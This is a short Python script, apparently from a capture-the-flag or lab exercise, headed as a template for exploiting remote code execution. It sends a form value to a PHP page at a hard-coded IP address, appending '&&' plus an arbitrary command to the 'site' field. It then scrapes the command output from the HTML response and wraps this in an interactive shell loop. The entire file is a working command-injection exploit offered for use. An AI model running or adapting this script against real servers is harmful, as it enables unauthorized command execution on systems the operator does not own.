#!/usr/bin/python
#
# Template for exploiting RCE vulnerabilities 

import os
import sys
import socket
import urllib
import requests

def runRCE(URL, cmd):
    r = requests.post(URL, data=cmd, headers={"content-type": "application/x-www-form-urlencoded"})
    return r.text

def remoteshell(URL, cmd):
    res = runRCE(URL, "site=iiro+*.dat+%26%26+" + cmd)
    f = res.split("<br><br><br></b><table><tr><td>")[1]
    s = f.split("</table>")[0]
    t = s.split("</td></tr><br>\n<tr><td>")[:-1]
    for line in t:
        print(line)

# Pipe stuff to Burp (or some other proxy)
#  proxies = {
#    'http': 'http://127.0.0.1:8510',
#  }


# USE LIKE: python attackshell.py http://exploitable.server.somewhere
if len(sys.argv) > 1:
    URL = sys.argv[1]
else:
    URL = "http://34.243.97.41/haveibeenpwned.php"

print("URL: " + URL)

data = ''

# 1. loop as long  as the commmand is not "exit"
# 2. all other commands are sent to the remote server for RCE 
while (data != 'exit'):
  try:
    data = input('>> ')
    if (data != 'exit'):
      remoteshell(URL, data)
  except EOFError:
    break
